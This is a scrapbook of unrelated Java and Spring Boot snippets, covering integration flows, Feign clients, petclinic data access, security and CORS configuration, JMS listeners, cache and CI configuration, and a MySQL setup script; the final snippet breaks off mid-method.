    public String home() {
        return "redirect:swagger-ui.html";
    }
}
--------------------------------------------------------------------------------------------------------
    @Bean
    public IntegrationFlow toUpperGetFlow() {
        return IntegrationFlows.from(
                Http.inboundGateway("/conversions/pathvariable/{upperLower}")
                        .requestMapping(r -> r
                                .methods(HttpMethod.GET)
                                .params("toConvert"))
                        .headerExpression("upperLower",
                                "#pathVariables.upperLower")
                        .payloadExpression("#requestParams['toConvert'][0]")
                        .id("toUpperLowerGateway"))
                .<String>handle((p, h) -> "upper".equals(h.get("upperLower")) ? p.toUpperCase() : p.toLowerCase())
                .get();
    }


    @ApiResponses(
            @ApiResponse(code = 200, message = "OK",
                    examples = @Example(@ExampleProperty(mediaType = "application/json",
                            value = "{\"gnarf\": \"dragons\"}"))))
--------------------------------------------------------------------------------------------------------

import org.springframework.cloud.openfeign.FeignClient;
import org.springframework.web.bind.annotation.GetMapping;
import org.springframework.web.bind.annotation.PathVariable;

////http://localhost:8000
@FeignClient(name = "currency-exchange-service", url="${CURRENCY_EXCHANGE_URI:http://localhost:8000}")
public interface CurrencyExchangeServiceProxy {

	///currency-exchange/from/EUR/to/INR
	@GetMapping("/currency-exchange/from/{from}/to/{to}")
	public CurrencyConversionBean retrieveExchangeValue(@PathVariable("from") String from,
			@PathVariable("to") String to);
}

@RestController
//@RefreshScope
--------------------------------------------------------------------------------------------------------
spring.application.name=netflix-eureka-naming-server
server.port=8761

eureka.client.register-with-eureka=false
eureka.client.fetch-registry=false

spring.application.name=spring-cloud-config-server
server.port=8888

spring.cloud.config.server.git.uri=https://github.com/in28minutes/dev-config-server-test.git
spring.cloud.config.server.git.searchPaths=dev
--------------------------------------------------------------------------------------------------------
import java.util.Arrays;
import java.util.stream.StreamSupport;

import org.slf4j.Logger;
import org.slf4j.LoggerFactory;
import org.springframework.context.event.ContextRefreshedEvent;
import org.springframework.context.event.EventListener;
import org.springframework.core.env.AbstractEnvironment;
import org.springframework.core.env.EnumerablePropertySource;
import org.springframework.core.env.Environment;
import org.springframework.core.env.MutablePropertySources;
import org.springframework.stereotype.Component;

@Component
public class EnvironmentConfigurationLogger {

	private static final Logger LOGGER = LoggerFactory.getLogger(EnvironmentConfigurationLogger.class);

	@SuppressWarnings("rawtypes")
	@EventListener
	public void handleContextRefresh(ContextRefreshedEvent event) {
		final Environment environment = event.getApplicationContext().getEnvironment();
		LOGGER.info("====== Environment and configuration ======");
		LOGGER.info("Active profiles: {}", Arrays.toString(environment.getActiveProfiles()));
		final MutablePropertySources sources = ((AbstractEnvironment) environment).getPropertySources();
		StreamSupport.stream(sources.spliterator(), false).filter(ps -> ps instanceof EnumerablePropertySource)
				.map(ps -> ((EnumerablePropertySource) ps).getPropertyNames()).flatMap(Arrays::stream).distinct()
				.forEach(prop -> LOGGER.info("{}", prop));// environment.getProperty(prop)
		LOGGER.info("===========================================");
	}

}
--------------------------------------------------------------------------------------------------------
import java.util.ArrayList;
import java.util.List;

import javax.xml.bind.annotation.XmlElement;
import javax.xml.bind.annotation.XmlRootElement;

/**
 * Simple domain object representing a list of veterinarians. Mostly here to be used for the 'vets' {@link
 * org.springframework.web.servlet.view.xml.MarshallingView}.
 *
 * @author Arjen Poutsma
 */
@XmlRootElement
public class Vets {

    private List<Vet> vets;

    @XmlElement
    public List<Vet> getVetList() {
        if (vets == null) {
            vets = new ArrayList<>();
        }
        return vets;
    }

}
--------------------------------------------------------------------------------------------------------
import org.springframework.data.jdbc.core.OneToManyResultSetExtractor;
import org.springframework.jdbc.core.ResultSetExtractor;
import org.springframework.samples.petclinic.model.Visit;

import java.sql.ResultSet;
import java.sql.SQLException;

/**
 * {@link ResultSetExtractor} implementation by using the
 * {@link OneToManyResultSetExtractor} of Spring Data Core JDBC Extensions.
 */
public class JdbcPetVisitExtractor extends
    OneToManyResultSetExtractor<JdbcPet, Visit, Integer> {

    public JdbcPetVisitExtractor() {
        super(new JdbcPetRowMapper(), new JdbcVisitRowMapper());
    }

    @Override
    protected Integer mapPrimaryKey(ResultSet rs) throws SQLException {
        return rs.getInt("pets.id");
    }

    @Override
    protected Integer mapForeignKey(ResultSet rs) throws SQLException {
        if (rs.getObject("visits.pet_id") == null) {
            return null;
        } else {
            return rs.getInt("visits.pet_id");
        }
    }

    @Override
    protected void addChild(JdbcPet root, Visit child) {
        root.addVisit(child);
    }
}
--------------------------------------------------------------------------------------------------------

import java.sql.ResultSet;
import java.sql.SQLException;
import java.time.LocalDate;
import java.util.Date;

import org.springframework.jdbc.core.RowMapper;

/**
 * {@link RowMapper} implementation mapping data from a {@link ResultSet} to the corresponding properties
 * of the {@link JdbcPet} class.
 */
class JdbcPetRowMapper implements RowMapper<JdbcPet> {

    @Override
    public JdbcPet mapRow(ResultSet rs, int rownum) throws SQLException {
        JdbcPet pet = new JdbcPet();
        pet.setId(rs.getInt("pets.id"));
        pet.setName(rs.getString("name"));
        pet.setBirthDate(rs.getObject("birth_date", LocalDate.class));
        pet.setTypeId(rs.getInt("type_id"));
        pet.setOwnerId(rs.getInt("owner_id"));
        return pet;
    }
}
--------------------------------------------------------------------------------------------------------
    /**
     * Loads the {@link Owner} with the supplied <code>id</code>; also loads the {@link Pet Pets} and {@link Visit Visits}
     * for the corresponding owner, if not already loaded.
     */
    @Override
    public Owner findById(int id) throws DataAccessException {
        Owner owner;
        try {
            Map<String, Object> params = new HashMap<>();
            params.put("id", id);
            owner = this.namedParameterJdbcTemplate.queryForObject(
                "SELECT id, first_name, last_name, address, city, telephone FROM owners WHERE id= :id",
                params,
                BeanPropertyRowMapper.newInstance(Owner.class)
            );
        } catch (EmptyResultDataAccessException ex) {
            throw new ObjectRetrievalFailureException(Owner.class, id);
        }
        loadPetsAndVisits(owner);
        return owner;
    }
--------------------------------------------------------------------------------------------------------
public interface SpringDataOwnerRepository extends OwnerRepository, Repository<Owner, Integer> {

    @Override
    @Query("SELECT DISTINCT owner FROM Owner owner left join fetch owner.pets WHERE owner.lastName LIKE :lastName%")
    public Collection<Owner> findByLastName(@Param("lastName") String lastName);

    @Override
    @Query("SELECT owner FROM Owner owner left join fetch owner.pets WHERE owner.id =:id")
    public Owner findById(@Param("id") int id);
}
--------------------------------------------------------------------------------------------------------
    @PutMapping
    ResponseEntity<FooResponse> putHander(@RequestParam(name = "a", required = false) String paramA,
                             @RequestParam(name = "b", required = false) String paramB,
                             @RequestHeader(name = "foo", required = false) String fooHeader,
                             @RequestHeader(name = "fooReq", required = false) String fooReqHeader,
                             @CookieValue(name = "foo", required = false) String fooCookie,
                             @CookieValue(name = "fooReq", required = false) String fooReqCookie,
                                          HttpServletResponse response){
--------------------------------------------------------------------------------------------------------
import org.springframework.data.domain.PageImpl;
import org.springframework.data.domain.Pageable;

import java.util.List;

/**
 * Created by jt on 2019-05-12.
 */
public class BeerPagedList extends PageImpl<BeerDto> {

    public BeerPagedList(List<BeerDto> content, Pageable pageable, long total) {
        super(content, pageable, total);
    }

    public BeerPagedList(List<BeerDto> content) {
        super(content);
    }
}
--------------------------------------------------------------------------------------------------------
    @ResponseStatus(HttpStatus.NOT_FOUND)
    @ExceptionHandler(NotFoundException.class)
    public ModelAndView handleNotFound(Exception exception){

        log.error("Handling not found exception");
        log.error(exception.getMessage());

        ModelAndView modelAndView = new ModelAndView();

        modelAndView.setViewName("404error");
        modelAndView.addObject("exception", exception);

        return modelAndView;
    }
--------------------------------------------------------------------------------------------------------
import guru.springframework.commands.CategoryCommand;
import guru.springframework.domain.Category;
import lombok.Synchronized;
import org.springframework.core.convert.converter.Converter;
import org.springframework.lang.Nullable;
import org.springframework.stereotype.Component;

/**
 * Created by jt on 6/21/17.
 */
@Component
public class CategoryCommandToCategory implements Converter<CategoryCommand, Category>{

    @Synchronized
    @Nullable
    @Override
    public Category convert(CategoryCommand source) {
        if (source == null) {
            return null;
        }

        final Category category = new Category();
        category.setId(source.getId());
        category.setDescription(source.getDescription());
        return category;
    }
}
--------------------------------------------------------------------------------------------------------
    @Override
    protected void configure(HttpSecurity http) throws Exception {
        http.authorizeRequests().antMatchers("/", "/index/**", "/product/**", "/checkout", "/docheckout").permitAll()
                .and().authorizeRequests().antMatchers("/login","logout").permitAll()
                .and().authorizeRequests().antMatchers("/static/css/**","/js/**", "/images/**", "/**/favicon.ico").permitAll()
                .and().formLogin().loginPage("/login").defaultSuccessUrl("/").permitAll()
                .and().logout()
                        .deleteCookies("remove")
                        .invalidateHttpSession(true)
                        .logoutUrl("/logout")
                        .logoutSuccessUrl("/logout-success")
                        .logoutRequestMatcher(new AntPathRequestMatcher("/logout"))
               ;
    }
--------------------------------------------------------------------------------------------------------
import org.springframework.jms.annotation.JmsListener;
import org.springframework.stereotype.Component;

/**
 * Created by jt on 5/6/16.
 */
@Component
public class JmsTextMessageListener {

    @JmsListener(destination = "text.messagequeue")
    public void onMessage(String msg){
        System.out.println("#### " + msg + " ###" );
    }
}
--------------------------------------------------------------------------------------------------------
#Validaiton Messages
#Order of precedence
# 1 code.objectName.fieldName
# 2 code.fieldName
# 3 code.fieldType (Java data type)
# 4 code
--------------------------------------------------------------------------------------------------------
    @Lock(LockModeType.PESSIMISTIC_WRITE)
    BeerOrder findOneById(UUID id);
--------------------------------------------------------------------------------------------------------
spring.jackson.serialization.indent_output=true
--------------------------------------------------------------------------------------------------------
spring.activemq.in-memory=true
spring.activemq.pooled=false
--------------------------------------------------------------------------------------------------------
DROP DATABASE IF EXISTS beersinventoryervice;
DROP USER IF EXISTS `beer_inventory_service`@`%`;
CREATE DATABASE IF NOT EXISTS beerinventoryservice CHARACTER SET utf8mb4 COLLATE utf8mb4_unicode_ci;
CREATE USER IF NOT EXISTS `beer_inventory_service`@`%` IDENTIFIED WITH mysql_native_password BY 'password';
GRANT SELECT, INSERT, UPDATE, DELETE, CREATE, DROP, REFERENCES, INDEX, ALTER, EXECUTE, CREATE VIEW, SHOW VIEW,
    CREATE ROUTINE, ALTER ROUTINE, EVENT, TRIGGER ON `beerinventoryservice`.* TO `beer_inventory_service`@`%`;
FLUSH PRIVILEGES;
--------------------------------------------------------------------------------------------------------
# Java Maven CircleCI 2.0 configuration file
#
# Check https://circleci.com/docs/2.0/language-java/ for more details
#
version: 2
jobs:
    build:
        docker:
        # specify the version you desire here
        - image: circleci/openjdk:11-browsers-legacy

        # Specify service dependencies here if necessary
        # CircleCI maintains a library of pre-built images
        # documented at https://circleci.com/docs/2.0/circleci-images/
        # - image: circleci/postgres:9.4

        working_directory: ~/repo

        environment:
            # Customize the JVM maximum heap limit
            MAVEN_OPTS: -Xmx3200m

        steps:
        - checkout

        # Download and cache dependencies
        - restore_cache:
              keys:
              - v1-dependencies-{{ checksum "pom.xml" }}
              # fallback to using the latest cache if no exact match is found
              - v1-dependencies-

        - run: mvn install -DskipTests

        - run: mvn dependency:go-offline

        - save_cache:
              paths:
              - ~/.m2
              key: v1-dependencies-{{ checksum "pom.xml" }}

        # run tests!
        - run: mvn integration-test
--------------------------------------------------------------------------------------------------------
import guru.springframework.sfgpetclinic.model.PetType;
import guru.springframework.sfgpetclinic.services.PetTypeService;
import org.springframework.format.Formatter;
import org.springframework.stereotype.Component;

import java.text.ParseException;
import java.util.Collection;
import java.util.Locale;

/**
 * Created by jt on 9/22/18.
 */
@Component
public class PetTypeFormatter implements Formatter<PetType> {

    private final PetTypeService petTypeService;

    public PetTypeFormatter(PetTypeService petTypeService) {
        this.petTypeService = petTypeService;
    }

    @Override
    public String print(PetType petType, Locale locale) {
        return petType.getName();
    }

    @Override
    public PetType parse(String text, Locale locale) throws ParseException {
        Collection<PetType> findPetTypes = petTypeService.findAll();

        for (PetType type : findPetTypes) {
            if (type.getName().equals(text)) {
                return type;
            }
        }

        throw new ParseException("type not found: " + text, 0);
    }
}
--------------------------------------------------------------------------------------------------------
import guru.sfg.common.events.BrewBeerEvent;
import guru.sfg.common.events.NewInventoryEvent;
import guru.springframework.msscbeerservice.config.JmsConfig;
import guru.springframework.msscbeerservice.domain.Beer;
import guru.springframework.msscbeerservice.repositories.BeerRepository;
import guru.springframework.msscbeerservice.web.model.BeerDto;
import lombok.RequiredArgsConstructor;
import lombok.extern.slf4j.Slf4j;
import org.springframework.jms.annotation.JmsListener;
import org.springframework.jms.core.JmsTemplate;
import org.springframework.stereotype.Service;
import org.springframework.transaction.annotation.Transactional;

/**
 * Created by jt on 2019-07-21.
 */
@Service
@RequiredArgsConstructor
@Slf4j
public class BrewBeerListener {

    private final BeerRepository beerRepository;
    private final JmsTemplate jmsTemplate;

    @Transactional
    @JmsListener(destination = JmsConfig.BREWING_REQUEST_QUEUE)
    public void listen(BrewBeerEvent event){
        BeerDto beerDto = event.getBeerDto();

        Beer beer = beerRepository.getOne(beerDto.getId());

        beerDto.setQuantityOnHand(beer.getQuantityToBrew());

        NewInventoryEvent newInventoryEvent = new NewInventoryEvent(beerDto);

        log.debug("Brewed beer " + beer.getMinOnHand() + " : QOH: " + beerDto.getQuantityOnHand());

        jmsTemplate.convertAndSend(JmsConfig.NEW_INVENTORY_QUEUE, newInventoryEvent);
    }
}
--------------------------------------------------------------------------------------------------------
    @JsonCreator(mode = JsonCreator.Mode.PROPERTIES)
    public BeerPagedList(@JsonProperty("content") List<BeerDto> content,
                         @JsonProperty("number") int number,
                         @JsonProperty("size") int size,
                         @JsonProperty("totalElements") Long totalElements,
                         @JsonProperty("pageable") JsonNode pageable,
                         @JsonProperty("last") boolean last,
                         @JsonProperty("totalPages") int totalPages,
                         @JsonProperty("sort") JsonNode sort,
                         @JsonProperty("first") boolean first,
                         @JsonProperty("numberOfElements") int numberOfElements) {

        super(content, PageRequest.of(number, size), totalElements);
    }
--------------------------------------------------------------------------------------------------------
<config
        xmlns:jsr107='http://www.ehcache.org/v3/jsr107'
        xmlns='http://www.ehcache.org/v3'>
    <service>
        <jsr107:defaults enable-management="true" enable-statistics="true"/>
    </service>
    
    <cache alias="beerCache" uses-template="config-cache"/>
    <cache alias="beerUpcCache" uses-template="config-cache"/>
    <cache alias="beerListCache" uses-template="config-cache"/>

    <cache-template name="config-cache">
        <expiry>
            <ttl unit="minutes">5</ttl>
        </expiry>
        <resources>
            <heap>1</heap>
            <offheap unit="MB">1</offheap>
        </resources>
    </cache-template>
</config>
--------------------------------------------------------------------------------------------------------
import org.domain.user.management.controllers.UserQueryController;
import org.domain.user.management.events.channels.UserEventChannel;
import org.domain.user.management.events.models.User;
import org.domain.user.management.services.commands.UserCommandService;
import org.slf4j.LoggerFactory;
import org.springframework.beans.factory.annotation.Autowired;
import org.springframework.cloud.stream.annotation.EnableBinding;
import org.springframework.cloud.stream.annotation.StreamListener;
import org.springframework.stereotype.Component;

@Component
@EnableBinding(UserEventChannel.class)
public class UserEventListenerImpl implements UserEventListener {

    @Autowired
    private UserCommandService userCommandService;

    private static org.slf4j.Logger logger = LoggerFactory.getLogger(UserQueryController.class);

    @Override
    @StreamListener(target = "userRegisteredEvent")
    public void processUserRegisteredEvent(User user) {
        String userName = userCommandService.createUser(user);
        logger.info("New User Created " + userName);
    }
}
--------------------------------------------------------------------------------------------------------
    @Override
    @Async
    @TransactionalEventListener(phase = TransactionPhase.AFTER_COMMIT)
    public void handleUserCreatedEvent(UserCreatedEvent userCreatedEvent) {
        User createdUser = userRepository.findById(userCreatedEvent.getId()).get();

        UserEventSnapshot userEventSnapshot = new UserEventSnapshot(createdUser.getId(),
                createdUser.getUsername());

        System.out.println(userEventSnapshot);

        userSource.userChannel().send(MessageBuilder.withPayload(userEventSnapshot).build());
    }
--------------------------------------------------------------------------------------------------------

import org.europepmc.springframework.social.orcid.api.OrcidApi;
import org.europepmc.springframework.social.orcid.api.impl.OrcidApiImpl;
import org.europepmc.springframework.social.orcid.api.impl.OrcidOAuth2Template;
import org.europepmc.springframework.social.orcid.utils.OrcidConfigBroker;
import org.springframework.social.oauth2.AbstractOAuth2ServiceProvider;
import org.springframework.social.oauth2.OAuth2Template;


/**
 * @author ygou
 *
 * Reference:
 *   1. http://members.orcid.org/api/tokens-through-3-legged-oauth-authorization
 */
public class OrcidServiceProvider extends AbstractOAuth2ServiceProvider<OrcidApi> {

    public OrcidServiceProvider(String clientId, String clientSecret) {
        super(getOAuth2Template(clientId, clientSecret));
    }

    private static OAuth2Template getOAuth2Template(String clientId, String clientSecret) {
        String authorizeUrl = OrcidConfigBroker.getOrcidConfig().getAuthorizeUrl();
        String accessTokenUrl = OrcidConfigBroker.getOrcidConfig().getAccessTokenUrl();
        OrcidOAuth2Template oAuth2Template = new OrcidOAuth2Template(clientId, clientSecret, authorizeUrl, accessTokenUrl);                
        oAuth2Template.setUseParametersForClientAuthentication(true);
        return oAuth2Template;
    }

    public OrcidApi getApi(String accessToken) {
            return new OrcidApiImpl(accessToken);
    }
    
}
--------------------------------------------------------------------------------------------------------
    @Override
    protected void configure(HttpSecurity http) throws Exception {
        http
            .authorizeRequests()
                .antMatchers("/").hasAnyRole("USER", "ADMIN")
                .antMatchers("/admin/**").hasRole("ADMIN")
//                .anyRequest().authenticated()
                .and()
            .formLogin()
                .loginPage("/login")
                .usernameParameter("username")
                .passwordParameter("password")
                .loginProcessingUrl("/auth/login_check")
                .defaultSuccessUrl("/")
                .and()
            .rememberMe()
                .key(REMEMBER_SERVICE_KEY)
                .rememberMeServices(myRememberMeServices());
    }
--------------------------------------------------------------------------------------------------------
#properties for localhost database
hostName.localhost=localhost
port.localhost=2017
databaseAuthentication.localhost=
userName.localhost=
password.localhost=

#properties for test database
hostName.test=mongos-test.ebi.ac.uk
port.test=27017
databaseAuthentication.test=admin
userName.test=admin_user
password.test=admin_user_password

#properties for prod 1 database
hostName.prod_1=mongos-prod-1.ebi.ac.uk
port.prod_1=27017
databaseAuthentication.prod_1=admin
userName.prod_1=admin_user
password.prod_1=admin_user_password

#properties for prod 2 database
hostName.prod_2=mongos-prod-2.ebi.ac.uk
port.prod_2=27017
databaseAuthentication.prod_2=admin
userName.prod_2=admin_user
password.prod_2=admin_user_password
--------------------------------------------------------------------------------------------------------

	public static boolean isNotEmpty(Object val){
		if (val == null){
			return false;
		}
		
		if (val instanceof String){
			if ("".equalsIgnoreCase(((String)val).trim())){
				return false;
			}
		}
		
		if (val instanceof List){
			if (((List)val).size()==0){
				return false;
			}
		}
		
		return true;
	}
--------------------------------------------------------------------------------------------------------

import org.springframework.context.annotation.Configuration;
import org.springframework.http.MediaType;
import org.springframework.web.servlet.config.annotation.ContentNegotiationConfigurer;
import org.springframework.web.servlet.config.annotation.WebMvcConfigurerAdapter;

@Configuration
public class AnnotationsAPIWebConfig extends WebMvcConfigurerAdapter {

  /**
    *  Total customization - see below for explanation.
    */
  @Override
  public void configureContentNegotiation(ContentNegotiationConfigurer configurer) {
    configurer.favorPathExtension(false).
            favorParameter(true).
            parameterName("format").
            ignoreAcceptHeader(true).
            useJaf(false).
            defaultContentType(MediaType.APPLICATION_JSON).
            mediaType("xml", MediaType.APPLICATION_XML).
            mediaType("json", MediaType.APPLICATION_JSON).
            mediaType("json_ld", MediaType.APPLICATION_JSON).
            mediaType("json-ld", MediaType.APPLICATION_JSON).
            mediaType("id_list", MediaType.APPLICATION_JSON).
            mediaType("tsv",MediaType.APPLICATION_JSON).
            mediaType("html",MediaType.TEXT_HTML);
  }
}
--------------------------------------------------------------------------------------------------------
	@Override
	protected void configure(HttpSecurity http) throws Exception {
	    http.cors().configurationSource(request -> new CorsConfiguration().applyPermitDefaultValues());
	}
--------------------------------------------------------------------------------------------------------
	@ApiModelProperty(value="JSON-LD context file")
	@JsonProperty(value="@context")
	private String context;
	/**"@context": "http://europepmc.org/europepmc-annotation-api-vocab.json", # context file
"id": "http://rdf.ebi.ac.uk/resource/europepmc/annotations/MED/21494379#1-1", # ann
"type": "Annotation",
"creator": "europepmc", # provider*/

/**@JsonTypeInfo(use = JsonTypeInfo.Id.NAME, include = JsonTypeInfo.As.PROPERTY, property = "creator")
@JsonSubTypes({
    @Type(value = AnnotationJsonLDNamedEntity.class, name = "Europe PMC"),
})*/
--------------------------------------------------------------------------------------------------------
@Component
class DemoCommandLineRunner implements CommandLineRunner{

	@Autowired
	private VehicleRepository vehicleRepository;

	@Override
	public void run(String... args) throws Exception {

		Vehicle audi = new Vehicle();
		audi.setId(UUID.randomUUID());
		audi.setVehicleIdentityNumber("Reg#1234");
		audi.setMake("Audi");
		audi.setModel("Q5");

		vehicleRepository.save(audi);

		Vehicle tesla = new Vehicle();
		tesla.setId(UUID.randomUUID());
		tesla.setVehicleIdentityNumber("Reg#6789");
		tesla.setMake("Tesla");
		tesla.setModel("Model S");

		vehicleRepository.save(tesla);
	}
}
--------------------------------------------------------------------------------------------------------
@Entity
@Table(name = "vehicle")
public class Vehicle {

    @Id
    private UUID id;

    private String vehicleIdentityNumber;

    private String make;

    private String model;

    public Vehicle() {
    }

    public UUID getId() {
        return id;
    }

    public void setId(UUID id) {
        this.id = id;
    }

    public String getVehicleIdentityNumber() {
        return vehicleIdentityNumber;
    }

    public void setVehicleIdentityNumber(String vehicleIdentityNumber) {
        this.vehicleIdentityNumber = vehicleIdentityNumber;
    }

    public String getMake() {
        return make;
    }

    public void setMake(String make) {
        this.make = make;
    }

    public String getModel() {
        return model;
    }

    public void setModel(String model) {
        this.model = model;
    }

    @Override
    public String toString() {
        return "Vehicle{" +
                "id=" + id +
                ", vehicleIdentityNumber='" + vehicleIdentityNumber + '\'' +
                ", make='" + make + '\'' +
                ", model='" + model + '\'' +
                '}';
    }
}
--------------------------------------------------------------------------------------------------------
    @Bean
    public CorsFilter corsFilter() {
        UrlBasedCorsConfigurationSource source = new UrlBasedCorsConfigurationSource();
        CorsConfiguration config = jHipsterProperties.getCors();
        if (config.getAllowedOrigins() != null && !config.getAllowedOrigins().isEmpty()) {
            log.debug("Registering CORS filter");
            source.registerCorsConfiguration("/api/**", config);
            source.registerCorsConfiguration("/v2/api-docs", config);
        }
        return new CorsFilter(source);
    }
--------------------------------------------------------------------------------------------------------
spring init -d=web,thymeleaf,data-rest,security -g=com.example -a=spring-boot-secure --package-name=com.example -name=spring-boot-secure -x

./mvnw spring-boot:run
spring init -dweb demo-rest

--------------------------------------------------------------------------------------------------------
  @ExceptionHandler(ConcurrencyFailureException.class)
    @ResponseStatus(HttpStatus.CONFLICT)
    @ResponseBody
    public ErrorVM processConcurrencyError(ConcurrencyFailureException ex) {
        return new ErrorVM(ErrorConstants.ERR_CONCURRENCY_FAILURE);
    }
	
	response.addHeader(JWTConfigurer.AUTHORIZATION_HEADER, "Bearer " + jwt);
	
    @GetMapping("/signup")
    public RedirectView signUp(WebRequest webRequest, @CookieValue(name = "NG_TRANSLATE_LANG_KEY", required = false, defaultValue = "\"en\"") String langKey) {
        try {
            Connection<?> connection = providerSignInUtils.getConnectionFromSession(webRequest);
            socialService.createSocialUser(connection, langKey.replace("\"", ""));
            return new RedirectView(URIBuilder.fromUri("/#/social-register/" + connection.getKey().getProviderId())
                .queryParam("success", "true")
                .build().toString(), true);
        } catch (Exception e) {
            log.error("Exception creating social user: ", e);
            return new RedirectView(URIBuilder.fromUri("/#/social-register/no-provider")
                .queryParam("success", "false")
                .build().toString(), true);
        }
    }
--------------------------------------------------------------------------------------------------------
    /**
     * GET  /audits : get a page of AuditEvents between the fromDate and toDate.
     *
     * @param fromDate the start of the time period of AuditEvents to get
     * @param toDate the end of the time period of AuditEvents to get
     * @param pageable the pagination information
     * @return the ResponseEntity with status 200 (OK) and the list of AuditEvents in body
     */
    @GetMapping(params = {"fromDate", "toDate"})
    public ResponseEntity<List<AuditEvent>> getByDates(
        @RequestParam(value = "fromDate") LocalDate fromDate,
        @RequestParam(value = "toDate") LocalDate toDate,
        @ApiParam Pageable pageable) {

        Page<AuditEvent> page = auditEventService.findByDates(
            fromDate.atStartOfDay(ZoneId.systemDefault()).toInstant(),
            toDate.atStartOfDay(ZoneId.systemDefault()).plusDays(1).toInstant(),
            pageable);
        HttpHeaders headers = PaginationUtil.generatePaginationHttpHeaders(page, "/management/audits");
        return new ResponseEntity<>(page.getContent(), headers, HttpStatus.OK);
    }
--------------------------------------------------------------------------------------------------------
#!/bin/bash

JAVA_OPTIONS="${JAVA_OPTIONS} -Xmx1024m -Xms512m -XX:MaxMetaspaceSize=256m"
JAR_FILE="target/luke-swing-with-deps.jar"

LOG_DIR=${HOME}/.luke.d/
if [[ ! -d ${LOG_DIR} ]]; then
  mkdir ${LOG_DIR}
fi

LUKE_PATH=$(cd $(dirname $0) && pwd)
cd ${LUKE_PATH}
nohup java ${JAVA_OPTIONS} -jar ${JAR_FILE} > ${LOG_DIR}/luke_out.log 2>&1 &



@echo off
set JAVA_OPTIONS=%JAVA_OPTIONS% -Xmx1024m -Xms512m -XX:MaxMetaspaceSize=256m
start javaw %JAVA_OPTIONS% -Dswing.systemlaf=com.jgoodies.looks.plastic.PlasticXPLookAndFeel -jar .\target\luke-swing-with-deps.jar
--------------------------------------------------------------------------------------------------------
@Test
public void givenUsingCommonsIo_whenByteArrayInputStreamToAByteBuffer_thenLengthMustMatch() 
  throws IOException {
    byte[] input = new byte[] { 0, 1, 2 };
    InputStream initialStream = new ByteArrayInputStream(input);
    ByteBuffer byteBuffer = ByteBuffer.allocate(3);
    ReadableByteChannel channel = newChannel(initialStream);
    IOUtils.readFully(channel, byteBuffer);
 
    assertEquals(byteBuffer.position(), input.length);
}
@Test
public void givenUsingGuava__whenByteArrayInputStreamToAByteBuffer_thenLengthMustMatch() 
  throws IOException {
    InputStream initialStream = ByteSource
      .wrap(new byte[] { 0, 1, 2 })
      .openStream();
    byte[] targetArray = ByteStreams.toByteArray(initialStream);
    ByteBuffer bufferByte = ByteBuffer.wrap(targetArray);
    while (bufferByte.hasRemaining()) {
        bufferByte.get();
    }
 
    assertEquals(bufferByte.position(), targetArray.length);
}
@Test
public void givenUsingCoreClasses_whenByteArrayInputStreamToAByteBuffer_thenLengthMustMatch() 
  throws IOException {
    byte[] input = new byte[] { 0, 1, 2 };
    InputStream initialStream = new ByteArrayInputStream(input);
    ByteBuffer byteBuffer = ByteBuffer.allocate(3);
    while (initialStream.available() > 0) {
        byteBuffer.put((byte) initialStream.read());
    }
 
    assertEquals(byteBuffer.position(), input.length);
}
--------------------------------------------------------------------------------------------------------
    @Autowired
    private SessionService sessionService;

    @GetMapping("/created")
    public ResponseEntity init() {
        final Session session = new Session();
        session.setId("c108cda3-8b4b-483d-a987-d65e6bfe3024");
        session.setFilepath("C:\\git-project\\paragon.microservices.distributor");
        session.setFilename("lombok.config");
        this.sessionService.save(session);
        return ResponseEntity.ok().build();
    }
--------------------------------------------------------------------------------------------------------
    InputStreamResource resource = new InputStreamResource(new FileInputStream(file));

    return ResponseEntity.ok()
            .headers(headers)
            .contentLength(file.length())
            .contentType(MediaType.parseMediaType("application/octet-stream"))
            .body(resource);
--------------------------------------------------------------------------------------------------------
//
// Source code recreated from a .class file by IntelliJ IDEA
// (powered by Fernflower decompiler)
//

package com.sun.applet2.preloader.event;

import com.sun.deploy.trace.Trace;
import com.sun.deploy.trace.TraceLevel;
import java.net.URL;

public class DownloadEvent extends PreloaderEvent {
    public static final int DOWNLOADING = 0;
    public static final int VERIFYING = 1;
    public static final int PATCHING = 2;
    private long completed;
    private long total;
    private int percent;
    private URL url;
    private String version;
    private String resourceLabel;
    private int downloadtype;
    protected boolean isStart = false;
    protected boolean isComplete = false;
    protected boolean isExplicit = false;
    private final String[] types = new String[]{"load", "verify", "patch"};

    public DownloadEvent(int var1, URL var2, String var3, String var4, long var5, long var7, int var9) {
        super(3);
        this.downloadtype = var1;
        this.url = var2;
        this.version = var3;
        this.resourceLabel = var4;
        this.completed = var5;
        this.total = var7;
        this.percent = var9;
    }

    public void normalize(int var1) {
        if (var1 < 100 && this.percent < 100) {
            if (var1 < 0) {
                Trace.println("warning: progress baseline could not be negative!", TraceLevel.PRELOADER);
            } else if (this.percent < var1) {
                Trace.println("warning: progress baseline above the progress value! " + this.percent + " < " + var1, TraceLevel.PRELOADER);
                this.percent = 0;
            } else {
                this.percent = 100 * (this.percent - var1) / (100 - var1);
                if (this.percent == 0) {
                    this.percent = 1;
                }

            }
        } else {
            this.percent = 100;
        }
    }

    public URL getURL() {
        return this.url;
    }

    public String getVersion() {
        return this.version;
    }

    public String getResourceLabel() {
        return this.resourceLabel;
    }

    public int getDownloadType() {
        return this.downloadtype;
    }

    public long getCompletedCount() {
        return this.completed;
    }

    public long getTotalCount() {
        return this.total;
    }

    public int getOverallPercentage() {
        return this.percent;
    }

    public boolean isStart() {
        return this.isStart;
    }

    public boolean isComplete() {
        return this.isComplete;
    }

    public boolean isExplicit() {
        return this.isExplicit;
    }

    public void sendExplicitEvent(boolean var1) {
        this.isExplicit = var1;
    }

    public String toString() {
        return "DownloadEvent[type=" + this.types[this.downloadtype] + ",loaded=" + this.getCompletedCount() + ", total=" + this.getTotalCount() + ", percent=" + this.getOverallPercentage() + "]";
    }
}
--------------------------------------------------------------------------------------------------------
import java.util.Date;
import java.util.List;

import org.springframework.beans.factory.annotation.Autowired;
import org.springframework.data.mongodb.core.MongoTemplate;
import org.springframework.data.mongodb.core.query.Criteria;
import org.springframework.data.mongodb.core.query.Query;
import org.springframework.stereotype.Service;

import cn.lqdev.learning.springboot.chapter31.biz.entity.NotifyMsg;
import cn.lqdev.learning.springboot.chapter31.biz.service.NotifyMsgService;

/**
 * MongoTemplate 访问实现
 * @author oKong
 *
 */
@Service
public class NotifyMsgServiceImpl implements NotifyMsgService{

	@Autowired
	MongoTemplate mongoTemplate;
	
	@Override
	public NotifyMsg saveNotifyMsg(NotifyMsg msg) {
		//使用 save和insert都可以进行插入
		//区别：当存在"_id"时
		//insert 插入已经存在的id时 会异常
		//save 则会进行更新
		//简单来说 save 就是不存在插入 存在更新
		mongoTemplate.insert(msg);
